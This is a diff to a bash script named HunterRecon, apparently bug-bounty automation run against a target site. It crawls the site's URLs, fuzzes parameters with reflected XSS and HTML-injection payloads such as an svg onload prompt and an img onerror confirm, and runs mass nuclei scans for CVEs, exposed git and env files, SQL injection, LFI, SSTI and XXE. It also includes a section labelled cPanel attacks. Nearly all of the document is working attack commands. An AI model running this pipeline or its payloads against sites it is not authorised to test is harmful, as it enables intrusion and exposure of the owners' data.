@@ -8,6 +8,9 @@ alp=false
 function banner {
         clear
         figlet -c -f slant HunterRecon | lolcat
+        echo "            Coded By: HunterDep" | lolcat
+        echo "            Version: 0.2" | lolcat
+        echo "            Target: $site" | lolcat
         echo
 }
 banner
@@ -91,10 +94,6 @@ cat vivos.rs | waybackurls | anew urls.cd
 cat vivos.rs | hakrawler | anew urls.cd
 
 banner
-echo "===== PHPINFO Recon & Git Exposed ====="
-cat vivos.rs | nuclei -tags phpinfo,git,env -c 125 --silent -o gitphpinfo.nucl
-
-banner
 echo "===== Param Recon ====="
 cat urls.cd | grep '?' | qsreplace 'FUZZ' | anew params.cd
 cat params.cd | gf xss | anew xss.gf
@@ -105,17 +104,13 @@ cat params.cd | gf lfi | anew lfi.gf
 
 banner
 echo "===== Param Attacks ====="
-cat params.cd | qsreplace 'kalirfl' | httpx -ms 'kalirfl' -o refletidos.cd -t 125
+cat params.cd | qsreplace 'kalirfl' | httpx --silent -ms 'kalirfl' -o refletidos.cd -t 125
 cat refletidos.cd | qsreplace '"><svg/onload=prompt(document.domain)>' | airixss -p 'prompt(document.domain)' | egrep -v 'Not' | anew airi.xss
 cat refletidos.cd | qsreplace '"><img src=x onerror=confirm()>' | airixss -p 'confirm()>' | egrep -v 'Not' | anew airi.xss
 cat refletidos.cd | qsreplace '"><h1 onclick=prompt()>its me</h1>' | airixss -p 'its me</h1>' | egrep -v 'Not' | anew airi.htmli
 cat refletidos.cd | qsreplace '"><iframe src=x>' | airixss -p 'src=x>' | egrep -v 'Not' | anew airi.htmli
 
 cat airi* | awk '{ print $3 }' | sed "s,\x1B\[[0-9;]*[a-zA-Z],,g" > vuln-injections.txt
-
-banner
-echo "===== Dalfox XSS ====="
-cat vuln-injections.txt | qsreplace | dalfox pipe --skip-bav --silence -o dalfox.xss
 
 banner
 echo "===== cPanel Attacks ====="
@@ -127,8 +122,9 @@ echo "===== Nuclei Scan ====="
 mkdir Nuclei-Tests
 
 cat vivos.rs | nuclei -t ~/nco/nucl-ant/ -es info --silent -o nuclei-old-scan.nucl -c 150
-cat vivos.rs | nuclei -tags exposure,config --silent -o nuclei-exposure-scan.nucl -c 150
-cat vivos.rs | nuclei -tags xss,sqli,lfi,ssti,csrf,crlf -es info --silent -o nuclei-tags.nucl -c 150
+cat vivos.rs | nuclei -tags cves,cve -c 125 --silent -o nuclei-cve-scan.nucl
+cat vivos.rs | nuclei -tags exposure,config,phpinfo,git,env --silent -o nuclei-exposure-scan.nucl -c 150 -es info
+cat vivos.rs | nuclei -tags xss,sqli,lfi,ssti,xxe,crlf -es info --silent -o nuclei-tags.nucl -c 150
 cat vivos.rs | nuclei -tags swagger --silent -o nuclei-swagger.nucl -c 150
 
 mv *.nucl Nuclei-Tests/
